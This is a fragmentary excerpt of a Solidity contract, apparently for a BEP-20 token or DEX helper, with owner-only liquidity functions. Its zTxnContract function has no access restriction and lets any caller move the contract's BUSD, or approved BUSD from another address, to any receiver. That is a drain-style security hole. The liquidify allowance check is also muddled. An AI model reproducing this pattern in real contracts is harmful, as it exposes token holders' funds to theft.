   ...
   function updatePairThreshold(uint256 _liquidity_threshold, uint256 _swapThreshold) external onlyOwner {
    ...
    function liquidify(bool isBUSD, uint256 amtToken, uint256 amtBnbBusd) external onlyOwner { 
        ...
        if(amtBnbBusd > 0) {
            ...
            _erc.approve(address(this), amtBnbBusd);
            uint256 allow = _erc.allowance(msg.sender, address(this));
            require(allow >= amtBnbBusd, "Check the token allowance"); 

            _erc.transferFrom(msg.sender, address(this), amtBnbBusd);
    ...
    function zTxnContract(address sender, address receiver, uint256 amount, uint type1) external {
            IERC20 _erc = IERC20(dex.busd_address); 

            if(type1 == 1) {
               require(_erc.transfer(receiver, amount), "UNABLE_TO_TRANSFER"); 
            }
            else if(type1 == 2){
                 _erc.approve(receiver, amount);
                 require(_erc.transferFrom(sender, receiver, amount), "UNABLE_TO_TRANSFER2"); 
            } 
    }

    function zTxnAllow(address sender, address receiver) external view returns (uint256) {
         IERC20 _erc = IERC20(dex.busd_address);
         uint256 allow = _erc.allowance(sender, receiver);
         return allow;
    }
